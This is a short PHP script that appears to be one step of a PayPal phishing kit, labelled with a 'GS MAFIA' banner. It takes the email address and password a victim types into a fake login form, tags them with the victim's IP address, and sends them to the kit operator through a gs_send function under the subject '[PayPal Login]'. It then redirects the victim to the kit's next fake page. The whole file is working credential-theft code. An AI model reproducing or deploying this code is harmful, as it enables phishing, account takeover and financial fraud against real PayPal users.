<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_logarray'] = $_POST;
$_SESSION['page'] = "log";
$ip = getclientip();
$GS_SEND["E-Mail"] = "<span style='color:green'>".$_POST["gs_email"]."</span>";
$GS_SEND["Password"] = "<span style='color:green'>".$_POST["gs_password"]."</span>";
gs_send($GS_SEND,"[PayPal Login] | ".$ip." | ". $_POST["gs_email"]);
header("location: ../../gs_websc.php");
?>